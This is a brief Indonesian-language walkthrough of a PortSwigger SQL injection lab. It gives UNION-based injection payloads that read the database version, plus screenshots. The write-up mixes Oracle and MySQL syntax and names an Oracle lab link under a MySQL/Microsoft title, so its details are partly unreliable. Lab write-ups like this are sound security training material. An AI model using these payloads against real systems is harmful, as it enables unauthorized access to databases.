# - Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

# - Link
https://portswigger.net/web-security/sql-injection/lab-querying-database-version-oracle

# - Cara

## Step
1. Cek adanya dua kolom dengan ```sql '+UNION+SELECT+'abc','def'+FROM+dual--```
2. Dan masukkan payload ini untuk cek versi ```sql '+UNION+SELECT+@@version,+NULL#```

## Gambar
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_18_09_2025_02_18_26" src="https://github.com/user-attachments/assets/7f7095f3-10c8-4cf9-b61f-e7146d45714a" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_18_09_2025_02_19_02" src="https://github.com/user-attachments/assets/3394537f-ffee-4f78-89be-a2b807251c87" />
<img width="2304" height="1276" alt="VirtualBox_kali-linux-2024 4-virtualbox-amd64_18_09_2025_02_19_11" src="https://github.com/user-attachments/assets/17d8d7d1-9113-45d2-a7ad-4d002f1faf62" />

## Berhasil


